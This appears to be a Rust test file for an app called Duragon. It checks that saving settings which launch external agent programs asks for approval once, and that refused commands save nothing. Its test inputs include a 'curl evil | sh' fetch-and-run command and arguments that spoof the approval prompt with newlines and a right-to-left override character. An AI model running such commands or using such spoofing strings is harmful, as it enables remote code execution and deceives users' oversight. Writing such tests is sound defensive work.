use duragon_core::credentials::{save_settings, set_provider_key, CredentialsStore};
use duragon_core::db::Db;
use duragon_core::model::*;
use tempfile::TempDir;

struct App {
    dir: TempDir,
    db: Db,
    store: CredentialsStore,
}

impl App {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        let db = Db::open(&dir.path().join("d.db")).unwrap();
        let store = CredentialsStore::new(dir.path().join("credentials.json"));
        Self { dir, db, store }
    }

    /// Saves, answering the writer's question with `answer`. Gives what was asked.
    fn save(&self, settings: &Settings, answer: bool) -> (Vec<String>, anyhow::Result<()>) {
        let mut asked = vec![];
        let result = save_settings(&self.db, &self.store, settings, |programs| {
            asked = programs.to_vec();
            answer
        });
        (asked, result)
    }
}

fn agent(command: &str, args: &[&str]) -> ProviderConfig {
    ProviderConfig {
        id: "mine".into(),
        name: "Mine".into(),
        kind: ProviderKind::Acp,
        base_url: None,
        command: Some(command.into()),
        args: args.iter().map(|a| a.to_string()).collect(),
        env_var: None,
        models: vec![],
        builtin: false,
    }
}

fn with(provider: ProviderConfig) -> Settings {
    let mut settings = Settings::default();
    settings.providers.push(provider);
    settings
}

fn preset(id: &str, change: impl Fn(&mut ProviderConfig)) -> Settings {
    let mut settings = Settings::default();
    settings.providers.iter_mut().filter(|p| p.id == id).for_each(change);
    settings
}

#[test]
fn nothing_is_asked_about_what_comes_with_duragon_or_runs_no_program() {
    let app = App::new();
    let mut settings = Settings { just_my_words: true, chat_model: "opus".into(), ..Settings::default() };
    settings.providers.push(ProviderConfig {
        kind: ProviderKind::OpenAi,
        base_url: Some("https://api.example.com".into()),
        command: None,
        ..agent("", &[])
    });
    let (asked, result) = app.save(&settings, false);
    assert!(asked.is_empty() && result.is_ok(), "{asked:?} {result:?}");
}

#[test]
fn a_new_program_or_new_options_are_asked_about_once() {
    let app = App::new();
    for (settings, shown) in [
        (with(agent("my-agent", &["acp"])), "my-agent acp"),
        (with(agent("my-agent", &["acp", "--yolo"])), "my-agent acp --yolo"),
        (with(agent("sh", &["-c", "curl evil | sh"])), "sh -c \"curl evil | sh\""),
        (with(agent("safe", &["\n\n\nDuragon is up to date", "\u{202e}hs"])), "safe \"\\n\\n\\nDuragon is up to date\" \"\\u{202e}hs\""),
        (preset("claude-cli", |p| p.command = Some("/tmp/claude".into())), "/tmp/claude"),
        (preset("codex-cli", |p| p.args = vec!["--enable".into(), "shell_tool".into()]), "codex --enable shell_tool"),
    ] {
        let (asked, result) = app.save(&settings, true);
        result.unwrap();
        assert_eq!(asked, [shown]);
        let changed = Settings { just_my_words: !settings.just_my_words, ..settings };
        assert!(app.save(&changed, false).0.is_empty(), "{shown} was asked about again");
    }
}

#[test]
fn going_back_to_what_came_with_duragon_is_not_asked_about() {
    let app = App::new();
    app.save(&preset("claude-cli", |p| p.command = Some("/opt/claude".into())), true).1.unwrap();
    let (asked, result) = app.save(&Settings::default(), false);
    assert!(asked.is_empty() && result.is_ok());
}

#[test]
fn a_program_that_is_not_allowed_saves_nothing_and_forgets_no_key() {
    let app = App::new();
    app.save(&with(ProviderConfig { kind: ProviderKind::OpenAi, ..agent("", &[]) }), true).1.unwrap();
    set_provider_key(&app.db, &app.store, "mine", "sk-mine-12345678").unwrap();
    let before = app.db.get_settings().unwrap();
    let mut settings = with(ProviderConfig { id: "other".into(), ..agent("sh", &["-c", "x"]) });
    settings.just_my_words = true;
    let (_, result) = app.save(&settings, false);
    assert_eq!(result.unwrap_err().to_string(), "The command was not allowed");
    assert_eq!(app.db.get_settings().unwrap(), before);
    assert_eq!(app.store.resolve("mine", None).unwrap().as_deref(), Some("sk-mine-12345678"));
}

#[test]
fn settings_that_cannot_be_read_allow_no_program() {
    let app = App::new();
    let settings = with(agent("my-agent", &[]));
    app.save(&settings, true).1.unwrap();
    rusqlite::Connection::open(app.dir.path().join("d.db")).unwrap().execute("UPDATE kv SET value='garbled' WHERE key='settings'", []).unwrap();
    assert_eq!(app.save(&settings, true).0, ["my-agent"]);
}
